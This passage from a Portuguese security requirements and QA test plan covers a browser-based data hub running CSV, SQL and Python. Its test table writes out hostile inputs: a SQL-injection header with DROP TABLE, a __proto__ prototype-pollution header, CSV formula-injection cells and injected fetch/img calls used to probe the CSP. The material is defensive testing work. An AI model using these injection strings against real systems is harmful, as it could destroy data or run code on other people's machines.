| SR-12 | Python: sem `micropip`; pacotes só os do `manifest.json`; início só por clique; aviso de código de terceiros presente em PT e EN; código vindo de URL, hash ou armazenamento nunca é executado automaticamente. |
| SR-13 | `localStorage` guarda apenas chaves documentadas (MVP: `ld-lang`, `ld-theme` e as que o Hub realmente precisar, sem conteúdo de arquivo); leituras validadas por lista de valores e dentro de `try/catch`. O botão "Limpar rascunhos" só é exigido se rascunho for formalizado (P2, adiado). |
| SR-14 | `hub/assets/vendor/manifest.json` contém, para cada biblioteca, nome, versão exata, URL de origem, SHA-256, licença lida, tamanho, data de verificação e data da consulta de advisories; o `loader.js` confere o hash antes de usar o arquivo. |
| SR-15 | Nenhum segredo, chave de API ou token no código ou nos dados. Chave PIX só como valor aprovado pelo Lucas, em payload estático. |
| SR-16 | Links externos com `target="_blank"` têm `rel="noopener noreferrer"`. Nenhum `<iframe>` de terceiro carrega antes de ação do usuário e só com aprovação. |
| SR-17 | `location.hash` e `location.search` só selecionam itens de listas fechadas; nunca são inseridos como HTML nem executados. |

### 14.2 Requisitos para o QA (casos de teste de segurança)

| ID | Teste | Resultado esperado |
|---|---|---|
| ST-01 | Payloads XSS em células, cabeçalhos, nome de arquivo, resultado SQL, `print` e `raise` do Python (seção 2.1, item 8), com troca PT/EN durante a exibição | Nenhum script executa; texto literal; dados não desaparecem na troca de idioma |
| ST-02 | Cabeçalhos maliciosos (`__proto__`, `x" INTEGER); DROP TABLE data; --`) e nome de arquivo com aspas e ponto e vírgula | Carrega normalmente, nada executado, `Object.prototype` intacto (conferir no Console: `({}).polluted === undefined`) |
| ST-03 | CSV injection: células `=1+1`, `+cmd`, `-2+3`, `@SUM(A1)`, TAB e CR iniciais; exportar; abrir no Excel e no LibreOffice | Nenhuma fórmula calculada; células numéricas legítimas intactas |
| ST-04 | Arquivos: vazio, binário renomeado `.csv`, 1 linha gigante, 1 milhão de colunas, UTF-16, acima do limite, 1 byte abaixo do limite | Mensagem de erro clara; aba responsiva; sem travamento; parsing em Worker com Parar (P0/MVP, C10.1) |
| ST-05 | SQL: `WITH RECURSIVE` infinito, `zeroblob`/`randomblob` enormes, junção cartesiana, 200 erros seguidos | **P0/MVP.** Timeout respeitado; Worker recriado; aba responsiva; sem vazamento de memória evidente |
| ST-06 | Python: testes da seção 4 (pyfetch, `js.fetch`, WebSocket, `micropip`, `import()`, Worker aninhado) com Network aberta | Nenhuma requisição de saída. Se algum passar, bloquear o release e corrigir o texto do aviso |
| ST-07 | Python: laço infinito e alocação de memória grande; "Parar" | Worker recriado; mensagem correta; aba responsiva |
| ST-08 | Aba Network durante o fluxo completo de cada página do Hub (carregar CSV, SQL, Python, exportar, trocar idioma, tema) | Zero requisições a domínios externos; zero requisições com dados do usuário |
| ST-09 | Console com cada página do Hub aberta | Sem violação de CSP em uso normal; presença da `<meta>` CSP em **todas** as páginas |
| ST-10 | Injetar via DevTools `<img src="https://example.com/x">` e `fetch("https://example.com")` | Bloqueados pela CSP (pelo menos no documento principal) |
| ST-11 | Inspeção de `localStorage`, `sessionStorage`, IndexedDB e cookies após uso | Somente chaves documentadas (MVP: `ld-lang`, `ld-theme`, mais as que o Hub documentar); sem conteúdo de arquivo; sem cookies |
| ST-12 | Alterar manualmente `ld-theme`, `ld-lang` e demais chaves do Hub para valores inválidos e JSON quebrado | Hub ignora o valor inválido, sem erro nem HTML injetado |
| ST-13 | Link com `#ex=` e `?lang=` contendo HTML e códigos | Ignorados ou tratados como texto; nenhum código executado |
| ST-14 | Alterar um byte de um arquivo em `hub/assets/vendor/` localmente | O `loader.js` recusa o arquivo (hash divergente) |
| ST-15 | PIX: decodificar o QR e a string copia-e-cola e comparar com a chave esperada registrada; validar o CRC16; pagar um valor mínimo em app bancário real e conferir nome e instituição mostrados | Idêntico ao registrado; CRC válido; nome conferido |
| ST-16 | Busca de segredos nos arquivos novos (comandos da seção 9) e busca textual de SR-01/SR-03 em `hub/` | Zero correspondências inesperadas |
| ST-17 | Downloads de recursos: abrir os arquivos, inspecionar metadados, procurar macros e dados pessoais | Sem macros, sem dado pessoal, hash publicado confere |
| ST-18 | Troca de idioma e de tema com dados na tela em todas as ferramentas | Dados do usuário preservados e sem HTML reinterpretado |

---

## 15. Itens que exigem aprovação do Lucas

Este documento recomenda; **não autoriza**. Nenhuma integração externa foi adotada.

| # | Decisão ou aprovação | Contexto |
|---|---|---|
| 1 | **Qual chave PIX expor**, e quais nome e cidade no payload; confirmar que aceita torná-los públicos de forma permanente no histórico do Git | SEC-12, seção 8 |
| 2 | Ativar 2FA/passkey, proteção do `main`, Secret Scanning e push protection no repositório; usar `CODEOWNERS` para os arquivos de PIX | SEC-13, SEC-17 (configuração do próprio Lucas) |
| 3 | Ler a página de limites do GitHub Pages **e os Termos do GitHub para produtos adicionais (não verificados por mim)** e decidir se aceita o risco da página PIX; plano de migração aceito | SEC-12/R2, seção 8 |
| 4 | D3: arquivos próprios (recomendado) e exceção de CDN para Pyodide, se necessária (SRI, versão fixa, dossiê de oito campos) | SEC-08, SEC-09 |
| 5 | Autohospedar fontes também no **portfólio atual** (altera `index.html` e `certificacoes.html`) | SEC-14 |
| 6 | Analytics: confirmar "nenhum" (recomendado) ou autorizar uma alternativa, com dossiê | SEC-15 |
| 7 | Vídeo incorporado de terceiros em cursos (envia IP ao provedor) ou apenas links | SEC-18 |
| 8 | Limites numéricos: tamanho máximo de arquivo, timeout padrão de SQL e Python, linhas exibidas | SEC-06, SEC-07 |
| 9 | Interpretação de "sem execução de código em servidor" como compatível com código do usuário rodando no navegador dele, isolado em Worker | SEC-21 |
| 10 | Aceitar a limitação de clickjacking e da CSP por `<meta>` (o Pages não oferece cabeçalhos); ou migrar para host com cabeçalhos | SEC-11, SEC-20 |
| 11 | Aprovar cada biblioteca (licença lida, versão fixada) antes do commit em `vendor/`, incluindo qualquer leitor de XLSX futuro e qualquer gerador de QR | SEC-08 |
| 12 | Parecer jurídico (LGPD, GDPR, aspectos fiscais do PIX), se o Lucas quiser segurança jurídica; não foi feito | seções 8 e 11 |

---

## 16. Pendências de verificação para a próxima sessão com acesso de rede aprovado

| ID | Pendência | Como resolver |
|---|---|---|
| V1 | Termos do GitHub Pages sobre doações (texto contratual). Página de limites segue [S] (8.1, C10.5 N6). Tentativa na rodada de reconciliação barrada | Ler "GitHub Terms for Additional Products and Features", seção Pages |
| V2 | Documentação do Pyodide (tentativa barrada na reconciliação; fonte primária `pyodide.org`): `micropip` opcional ou não, `loadPackage`, necessidade de `unsafe-eval`, hashes no `pyodide-lock.json` | Documentação da versão fixada |
| V3 | Advisories: sql.js, Papa Parse, Pyodide (tentativa em GitHub Security Advisories barrada na reconciliação) | GitHub Advisory Database, OSV, npm |
| V4 | Licenças (P2 do Architect) | Ler os arquivos `LICENSE` originais |
| V5 | Herança de CSP em Workers e capacidade da `<meta>` no GitHub Pages | Site de teste publicado, `example.com` como alvo de teste |
| V6 | Cabeçalhos reais do Pages (CORS, MIME de `.wasm`, `Cache-Control`) | Idem (P3) |
| V7 | `escapeFormulae` no Papa Parse 5.7.1 | Ler `papaparse.js` baixado |
| V8 | Funções e autorizador do sql.js 1.15.0; `load_extension` ausente | Ler o fonte e testar |
| V9 | Política de privacidade do Google Fonts e decisões jurídicas citadas de memória | Leitura de fonte oficial |
| V10 | Configuração atual do repositório: 2FA, proteção de ramo, Secret Scanning, "Enforce HTTPS" | Lucas confere em Settings |
